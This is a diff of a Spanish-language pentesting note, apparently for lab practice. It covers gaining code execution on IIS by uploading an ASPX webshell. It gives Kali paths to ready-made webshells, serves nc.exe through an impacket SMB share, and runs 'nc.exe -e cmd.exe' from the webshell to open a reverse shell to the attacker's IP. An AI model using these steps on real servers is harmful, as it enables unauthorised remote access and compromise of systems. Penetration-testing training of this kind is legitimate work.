@@ -2,6 +2,7 @@
 
 IIS (Internet Information Services) ejecuta paginas ASPX. Si podemos subir un archivo ASPX, podemos ejecutar comandos.
 
+`.aspx`, `.html`,`.php` o `.bat`
 ## Encontrar Webshells ASPX Preinstaladas
 
 ```bash
@@ -9,8 +10,9 @@ find / -name cmdasp.aspx 2>/dev/null
 cp /usr/share/webshells/aspx/cmdasp.aspx .
 ```
 
+Otra ruta de webshell de Kali: 
+
 ```bash
-locate .aspx
 cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/cmd.aspx .
 ```
 
@@ -37,6 +39,8 @@ cp /usr/share/wordlists/SecLists/Web-Shells/FuzzDB/nc.exe .
 Compartimos nc.exe via SMB y nos ponemos en escucha:
 
 ```bash
+impacket-smbserver share </home/Kali/Desktop>    #share, recurso, como tú quieras llamarlo
+o
 impacket-smbserver recurso $(pwd) -smb2support
 
 nc -nlvp <puerto>
@@ -45,7 +49,7 @@ nc -nlvp <puerto>
 Desde el navegador (en la webshell ASPX), ejecutamos:
 
 ```
-\\<IP_atacante>\recurso\nc.exe -e cmd.exe <IP_atacante> <puerto>
+\\<IP_atacante>\share\nc.exe -e cmd.exe <IP_atacante> <puerto>
 ```
 
 ## Opcion 2: Payload ASPX Directo
